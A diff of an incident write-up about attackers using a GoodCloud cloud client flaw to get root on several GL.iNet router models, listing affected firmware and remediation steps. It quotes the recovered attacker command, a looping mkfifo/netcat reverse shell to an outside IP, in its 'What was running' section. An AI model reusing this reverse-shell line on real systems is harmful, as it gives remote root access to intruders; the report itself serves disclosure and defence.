@@ -1,9 +1,28 @@
-# The remote shell on GL-AXT1800 routers
+# The remote shell on routers, and the cloud command behind it
 
 First posted in the GL.iNet forum on 21 November 2026 ([post 34](https://forum.gl-inet.com/t/quickly-check-if-your-router-is-under-attack/73070/34)).
 Findings R-1 to R-9 and R-13 to R-17 in [findings.md](findings.md). Times are UTC. Last updated 22 November 2026.
 
-## What was running (read at 15:25 UTC on November 21)
+## Which routers
+
+This is not a GL-AXT1800 (Slate AX) problem. That model is where the shell was found; the code
+that let it in is in other models too.
+
+- **The unchecked code** is in every GoodCloud client we have read from GL-MT3000 firmware 4.7.0
+  (released 2024-12-05) to 4.11.0, and in GL-AXT1800 4.8.2, 4.8.3 and 4.8.4.
+  It follows the build of the cloud package `gl-sdk4-cloud`, not the firmware number or whether
+  a model offers AstroWarp: the package of 4.6.9 (build `git-2024.212`) already had an AstroWarp
+  module without this code, and the code is there from build `git-2024.337` on, which GL-MT3000 4.7.0
+  and GL-MT6000 4.7.0 both carry.
+- **The attacker used it on at least seven models.** Routers we manage of the models GL-AXT1800,
+  GL-AX1800, GL-MT2500, GL-MT3000, GL-MT5000, GL-MT6000 and GL-MT3600BE, on firmware from 4.7.4 to
+  4.9.0, show the firewall rule this command leaves. On seven of them we recovered the command
+  itself: it ran as root, looked for the folders of the KVM implant and sent the result to the
+  attacker's server. See findings R-15 and R-17.
+- **The interactive shell described below** has so far been found only on GL-AXT1800, firmware
+  4.8.2 and 4.8.3.
+
+## What was running on our GL-AXT1800 (read at 15:25 UTC on November 21)
 
 ```
 sh -c iptables -t nat -A SDWAN_IP_MAPPING -d 127.0.0.1 -j DNAT --to-destination 127.0.0.1;(while true;do rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 170.39.226.219 42499 >/tmp/f;sleep 3;done) >/dev/null 2>&1 &
@@ -23,7 +42,7 @@ All three ran as root, and `netstat` showed the connection to 170.39.226.219:424
 | a router we manage | AXT1800 4.8.2 | 170.39.226.219:41221 | three shells: 20:46:35, 21:17:27 and 21:39:45 UTC, Nov 20 |
 | a router we manage | AXT1800 4.8.2 | 170.39.226.219:41297 | 21:39:47 UTC, Nov 20 |
 
-Same address, a different port in each, and a shell started within a minute of 21:40 on all four where it was measured (ours are from the process start time in `/proc`). The two routers on 4.8.2 had not been restarted and the shells were still running when we checked them on 22 November.
+Same address, a different port in each, and a shell started within a minute of 21:40 on all four where it was measured (ours are from the process start time in `/proc`). The two routers on 4.8.2 had not been restarted and the shells were still running when we checked them on 22 November. Since then we have found it running on three more routers we manage, one on 4.8.2 and two on 4.8.3; counts are in the [field survey](field-survey.md).
 
 ## How it got in
 
@@ -80,12 +99,3 @@ on ours, but neither that nor a reboot undoes the compromise: treat every secret
 router as read by someone else (VPN keys and configs, Wi-Fi passwords, the admin password hash,
 anything else it holds), reinstall the firmware without keeping settings, and replace those
 secrets where they are used.
-
-## Also affected by the same code
-
-- The same unchecked code is in the GoodCloud client of GL-MT3000 firmware 4.11.0 (built
-  2026-09-24). The earliest firmware in which we find it is GL-MT3000 4.7.0, released
-  2024-12-05.
-- We have only seen the shell on GL-AXT1800. Routers of other models were sent a different
-  command through the same code, which ran as root and left only the firewall rule; see findings
-  R-15 and R-17.
